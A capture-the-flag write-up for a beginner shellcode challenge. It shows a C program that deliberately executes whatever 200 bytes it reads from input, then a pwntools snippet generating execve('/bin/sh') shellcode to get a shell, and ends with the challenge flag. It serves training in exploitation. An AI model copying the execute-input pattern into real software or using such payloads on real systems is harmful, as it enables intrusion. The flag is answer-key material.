# $hellc0de-0x1

## Write-up

- Source code :  

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define CODE_SIZE 200

void disable_buffering(void);

char code[CODE_SIZE] = { '\0' };

int main(int argc, char *argv[]) {
  disable_buffering();

  printf("Enter your shellcode : ");

  read(0, code, CODE_SIZE);

  (*(void(*)()) code)();

  return EXIT_SUCCESS;
}

void disable_buffering(void) {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
}
```

- We can basically run any code that fits in 200 bytes
- We can use the `shellcraft` module from `pwntools` to generate shellcode that gives us a shell :  

```python
shellcode = asm(
    shellcraft.execve("/bin/sh", 0, 0)
)
```

- Full automated exploit with pwntools [here](solve.py)

## Flag

`shellmates{sHellC0d3_bAByyYYYyy}`
